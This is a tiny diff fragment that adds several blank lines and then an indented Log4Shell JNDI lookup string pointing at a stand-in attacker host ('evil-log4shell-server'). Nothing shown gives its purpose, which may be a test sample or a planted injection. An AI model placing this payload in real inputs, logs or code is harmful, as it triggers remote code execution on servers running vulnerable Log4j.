@@ -1,0 +1,6 @@
+
+
+
+
+
+          ${jndi:ldap://evil-log4shell-server/}
